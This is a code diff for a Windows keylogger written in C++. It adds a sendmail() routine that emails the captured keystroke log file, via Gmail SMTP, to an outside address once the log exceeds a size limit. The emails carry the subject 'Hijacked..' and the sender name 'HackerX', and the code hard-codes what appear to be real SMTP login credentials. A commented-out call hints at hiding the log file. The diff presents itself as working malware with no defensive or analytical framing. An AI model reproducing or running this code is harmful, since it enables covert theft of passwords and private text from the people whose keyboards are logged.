@@ -9,9 +9,46 @@
 #include "KeyLogger.h"
 using namespace std;
 
+
 FILE* f;
 HHOOK hKeyboardHook;
 static int keysPressed = 0;
+
+void sendmail() {
+	CkMailMan mailman;
+
+	mailman.put_SmtpHost("smtp.gmail.com");
+	mailman.put_SmtpUsername("didlaak6000@gmail.com");
+	mailman.put_SmtpPassword("alvrbqh95");
+
+	mailman.put_SmtpSsl(true);
+	mailman.put_SmtpPort(465);
+
+	CkEmail email;
+	email.put_Subject("Hijacked..");
+	email.put_Body("Well Done!");
+	email.put_From("HackerX");
+
+	bool success = email.AddTo(NULL, "didlaak6000@naver.com");
+
+	const char* content = email.addFileAttachment(getlogfilepath(getlogfilename()));
+	if (email.get_LastMethodSuccess() != true) {
+		cout << email.lastErrorText() << "\r\n";
+	}
+
+	success = mailman.SendEmail(email);
+	if (success != true) {
+		std::cout << mailman.lastErrorText() << "\r\n";
+				return;
+	}
+
+	success = mailman.CloseSmtpConnection();
+	if (success != true) {
+		cout << "Connection to SMTP server not closed cleanly." << "\r\n";
+	}
+
+	cout << "Mail with attachments sent!" << "\r\n";
+}
 
 DWORD WINAPI Keylogger(LPVOID lpParm) {
     HINSTANCE hins;
@@ -59,6 +96,7 @@ LRESULT WINAPI Hook(int nCode, WPARAM wParam, LPARAM lParam) {		// logging keyst
 			fprintf(f, "\n");
 		}
 		keysPressed++;
+		// hidefile(workFullPath);
 		fclose(f);
 	}
 	return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
@@ -80,10 +118,9 @@ void FSD() {		// File size detetor
     while (TRUE) {
         Sleep(1000);
         if (getfilesize() > MAX_FILE_SIZE) {
-			/* sends logfile to email
-			...
-			or upload to server*/
             printf("File size over!\n");
+			// sends logfile to email
+			sendmail();
         }
     }
 }
